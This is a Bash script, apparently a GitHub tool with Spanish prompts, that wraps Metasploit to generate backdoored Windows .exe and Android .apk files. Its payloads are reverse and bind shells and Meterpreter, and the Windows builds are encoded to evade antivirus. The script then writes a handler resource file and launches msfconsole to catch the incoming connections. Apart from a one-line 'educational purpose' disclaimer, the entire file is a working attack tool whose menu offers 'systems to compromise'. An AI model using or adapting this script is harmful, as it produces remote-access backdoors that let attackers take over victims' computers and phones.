#!/bin/bash
#This exploit be used to EDUCATIONAL PURPOSE only
OWNER='n0obit4'
GITHUB='https://github.com/n0obit4'
VERSION='v1.0'
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
transparent="\e[0m"
Cyan="\033[0;36m"
ruta="/tmp/iniciar.rc"
###########################
#     Author              #
#   BY: n0obit4           #
#   Date: 15/May/2020     #
###########################
#Github: https://github.com/n0obit4

clear

#lista de payloads
WindowsPayloads=("windows/shell/reverse_tcp" "windows/shell_bind_tcp" "windows/meterpreter/reverse_tcp" "windows/meterpreter/reverse_http")
AndroidPayloads=("android/shell/reverse_tcp" "android/shell/reverse_http" "android/meterpreter/reverse_tcp" "android/meterpreter/reverse_http")

#verificar si es root
if [[ $EUID > 0 ]]; then # we can compare directly with this syntax.
  echo                "##################################################################"
  echo -e "$yellow""#                 Please run as root/sudo                        # "
  echo -e "$red""#                 sudo bash Friendzone.sh                        #""$transparent"
  echo                "##################################################################"
  exit 1
fi

#tu direccion ip local
#muestra la primera dirección ip del host
lanip=`hostname -I | awk '{print $1}'`

#puerto por default
defport="4444"

#Funcion windows
function windows(){

  #recolectando datos
  echo -e "$red" ""
  echo "          Payloads            "
  echo -e " ╔══════════════════════════════════════╗" "$transparent"
  echo -e "$red" "╠ ""$green"  "0)-""$transparent""$yellow""${WindowsPayloads[0]}""$red" "       ╣"
  echo -e "$red" "╠ ""------------------------------------""$red"" ╣"
  echo -e "$red" "╠ ""$green"  "1)-""$transparent""$yellow""${WindowsPayloads[1]}""$red"  "          ╣"
  echo -e "$red" "╠ ""------------------------------------""$red"" ╣"
  echo -e "$red" "╠ ""$green"  "2)-""$transparent""$yellow""${WindowsPayloads[2]}""$red" " ╣"
  echo -e "$red" "╠ ""------------------------------------""$red"" ╣"
  echo -e "$red" "╠ ""$green"  "3)-""$transparent""$yellow""${WindowsPayloads[3]}""$red" "╣"
  echo -e "$red"" ╚══════════════════════════════════════╝"
  echo ""
  echo -ne "$blue"["$yellow"*"$transparent""$blue"]"$blue""Seleccione el payload: "
  read payload
  echo -ne "$blue"["$yellow"*"$transparent""$blue"]"$blue""Digite su dirección ip ("$green"$lanip"$transparent""$blue"): "
  read ip
  ip="${ip:-${lanip}}"
  echo -ne "$blue"["$yellow"*"$transparent""$blue"]"$blue""Digite el puerto ("$green"$defport"$transparent""$blue"): "
  read puerto
  puerto="${puerto:-${defport}}"
  echo -ne "$blue"["$yellow"*"$transparent""$blue"]"$blue""Nombre del backdoor(.exe): "
  read name
  nombre=$name".exe"

  #limpiar la terminal
  clear

  #Mostrando datos recolectados
  echo -e "$yellow""Trabajando con los siguientes datos"
  echo ""
  echo -e "$blue" "╔══════════════════════════════════════════╗"
  echo -e "$blue" "╠ IP: "$transparent" "$red"$ip " "$transparent"
  echo -e "$blue" "╠ Puerto: "$transparent" "$red"$puerto " "$transparent"
  echo -e "$blue" "╠ Payload: "$transparent" "$red"${WindowsPayloads[payload]} " "$transparent"
  echo -e "$blue" "╠ Nombre: "$transparent" "$red"$nombre " "$transparent"
  echo -e "$blue" "╠ By: "$transparent" "$red"$OWNER " "$transparent"
  echo -e "$blue" "╠ Github: "$transparent" "$red"$GITHUB " "$transparent"
  echo -e "$blue" "╚══════════════════════════════════════════╝"

  #generando .rc para metasploit
  echo '''
  use exploit/multi/handler
  set payload '${WindowsPayloads[payload]}'
  set LHOST '$ip'
  set LPORT '$puerto'
  exploit
  ''' > $ruta

  #trabajando
  if [ -d output ];
  then
  echo ""
  else
  mkdir output
  fi
  #Creando exploit
  msfvenom -p ${WindowsPayloads[payload]} -a x86 --platform windows -e x86/shikata_ga_nai -i 11 LHOST=$ip LPORT=$puerto -f exe -o "output/$nombre" 2&> /dev/null

  echo -e "$green" "Finalizado"

  echo ""
  #Iniciar metasploit con el .rc
  echo -ne "Desea listarlo con metasploit (S/N): "
  read metas

  if [ "$metas" = "s" ];then
    msfconsole -q -r $ruta
  elif [ "$metas" = "S" ];then
    msfconsole -q -r $ruta
  else
    echo -e "$red""bye :("

  fi

}

#funcion Android
function Android() {


  #recolectando datos
  echo -e "$red" ""
  echo "          Payloads            "
  echo -e " ╔══════════════════════════════════════╗" "$transparent"
  echo -e "$red" "╠ ""$green"  "0)-""$transparent""$yellow""${AndroidPayloads[0]}""$red" "       ╣"
  echo -e "$red" "╠ ""------------------------------------""$red"" ╣"
  echo -e "$red" "╠ ""$green"  "1)-""$transparent""$yellow""${AndroidPayloads[1]}""$red"  "      ╣"
  echo -e "$red" "╠ ""------------------------------------""$red"" ╣"
  echo -e "$red" "╠ ""$green"  "2)-""$transparent""$yellow""${AndroidPayloads[2]}""$red" " ╣"
  echo -e "$red" "╠ ""------------------------------------""$red"" ╣"
  echo -e "$red" "╠ ""$green"  "3)-""$transparent""$yellow""${AndroidPayloads[3]}""$red" "╣"
  echo -e "$red"" ╚══════════════════════════════════════╝"
  echo ""
  echo -ne "$blue"["$yellow"*"$transparent""$blue"]"$blue""Seleccione el payload: "
  read payload
  echo -ne "$blue"["$yellow"*"$transparent""$blue"]"$blue""Digite su dirección ip ("$green"$lanip"$transparent""$blue"): "
  read ip
  ip="${ip:-${lanip}}"
  echo -ne "$blue"["$yellow"*"$transparent""$blue"]"$blue""Digite el puerto ("$green"$defport"$transparent""$blue"): "
  read puerto
  puerto="${puerto:-${defport}}"
  echo -ne "$blue"["$yellow"*"$transparent""$blue"]"$blue""Nombre del backdoor(.apk): "
  read name
  nombre=$name".apk"

  #limpiar la terminal
  clear


  echo -e "$yellow""Trabajando con los siguientes datos"
  echo ""

  echo -e "$blue" "╔══════════════════════════════════════════╗"
  echo -e "$blue" "╠ IP: "$transparent" "$red"$ip " "$transparent"
  echo -e "$blue" "╠ Puerto: "$transparent" "$red"$puerto " "$transparent"
  echo -e "$blue" "╠ Payload: "$transparent" "$red"${AndroidPayloads[payload]} " "$transparent"
  echo -e "$blue" "╠ Nombre: "$transparent" "$red"$nombre " "$transparent"
  echo -e "$blue" "╠ By: "$transparent" "$red"$OWNER " "$transparent"
  echo -e "$blue" "╠ Github: "$transparent" "$red"$GITHUB " "$transparent"
  echo -e "$blue" "╚══════════════════════════════════════════╝"
  
  #generando .rc para metasploit
  echo '''
  use exploit/multi/handler
  set payload '${AndroidPayloads[payload]}'
  set LHOST '$ip'
  set LPORT '$puerto'
  exploit
  ''' > $ruta
  #trabajando
  if [ -d output ];
  then
  echo ""
  else
  mkdir output
  fi
  
  #Creando exploit
  msfvenom -p ${AndroidPayloads[payload]} --platform android LHOST=$ip LPORT=$puerto -f apk -o "output/$nombre" 2&> /dev/null

  echo -e "$green" "Finalizado"

  echo ""
  #Iniciar metasploit con el .rc
  echo -ne "Desea listarlo con metasploit (S/N): "
  read metas

  if [ "$metas" = "s" ];then
    msfconsole -q -r $ruta
  elif [ "$metas" = "S" ];then
    msfconsole -q -r $ruta
  else
    echo -e "$red""bye :("

  fi




}



#funcion menu
function menu() {
  #banner
  echo  -e "$red""                                                          "
  echo  "    ______     _                __                       "
  echo  "   / ____/____(_)__  ____  ____/ /___  ____  ____  ___   "
  echo  "  / /_  / ___/ / _ \/ __ \/ __  /_  / / __ \/ __ \/ _ \  "
  echo  " / __/ / /  / /  __/ / / / /_/ / / /_/ /_/ / / / /  __/  "
  echo  "/_/   /_/  /_/\___/_/ /_/\__,_/ /___/\____/_/ /_/\___/  $VERSION  "
  echo  "                                                         "
  echo  "                                            BY: $OWNER   "
  echo  -e "Github: https://github.com/n0obit4 \n                 " "$transparent"
  
  echo -e "$yellow""Sistemas para comprometer"
  echo ""
  echo -e "$green""1)-"$yellow" Windows"
  echo -e "$green""2)-"$yellow" Android"
  echo ""
  echo -e "$red""(S)-Salir"
  echo ""
  echo -ne "$blue""["$yellow"*"$transparent"]"$blue"Seleccione su opción: "
  read opcion
  if [ "$opcion" = "1" ];then
    #llamando funcion de windows
    clear
    windows
  elif [ "$opcion" = "2" ];then
    #llamando funcion de Android
    clear
    Android
  elif [ "$opcion" = "S" ];then
    echo -e "$red""Saliendo..."
    sleep 2.5
    clear
  elif [ "$opcion" = "s" ];then
    echo -e "$red""Saliendo..."
    sleep 2.5
    clear
  else
    echo -e "$red""Error al elegir la opción."
    sleep 2.5
    clear
    menu
  fi

}
menu
